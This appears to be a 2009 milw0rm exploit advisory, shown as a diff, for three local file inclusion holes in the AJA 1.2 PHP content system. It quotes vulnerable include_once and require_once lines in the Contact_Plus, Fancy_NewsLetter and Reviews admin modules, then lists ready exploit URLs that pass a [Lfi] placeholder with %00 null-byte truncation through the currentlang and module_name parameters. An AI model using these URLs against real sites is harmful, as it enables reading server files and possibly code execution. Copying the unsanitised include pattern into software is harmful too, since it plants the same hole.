@@ -1,0 +1,50 @@
+                      -------------:multi local file include:------------
+---------------
+script:AJA 1.2
+   
+------------------------------------------------------------------
+download from:http://www.magtrb.com/en/modules.php?name=Downloads&op=getit&lid=6
+   
+------------------------------------------------------------------
+
+........................................................
+vul1: \modules\Contact_Plus\admin\case.php line 14:
+
+if (!stristr($_SERVER['SCRIPT_NAME'], "".$admin_file.".php")) { die ("Access Denied"); }
+$module_name = "Contact_Plus";
+include_once("modules/$module_name/admin/language/lang-".$currentlang.".php"); line 14
+
+...............
+
+vul2: /modules/Fancy_NewsLetter/admin/includes/FANCYNLOptions.php line 2:
+
+require_once('modules/'.$module_name.'/admin/includes/Modules/Banners.php'); line2
+...............
+
+vul3: /modules/Reviews/admin/case.php line 14:
+
+if (!eregi("".$admin_file.".php", $_SERVER['SCRIPT_NAME'])) { die ("Access Denied"); }
+$module_name = "Reviews";
+include_once("modules/$module_name/admin/language/lang-".$currentlang.".php"); line 14
+
+-----------------------------------------------------
+-----------------------------------------------------
+
+xpl:
+
+http://127.0.0.1/path/modules/Contact_Plus/admin/case.php?currentlang=[Lfi]%00
+
+http://127.0.0.1/path/modules/Fancy_NewsLetter/admin/includes/FANCYNLOptions.php?module_name=[Lfi]%00
+
+http://127.0.0.1/path/modules/Reviews/admin/case.php?currentlang=[Lfi]%00
+
+***************************************************
+***************************************************
+---------------------------------------------------
+Author: ahmadbady [kivi_hacker666@yahoo.com]
+
+from[iran-tehran]
+---------------------------------------------------
+
+
+# milw0rm.com [2009-02-02]
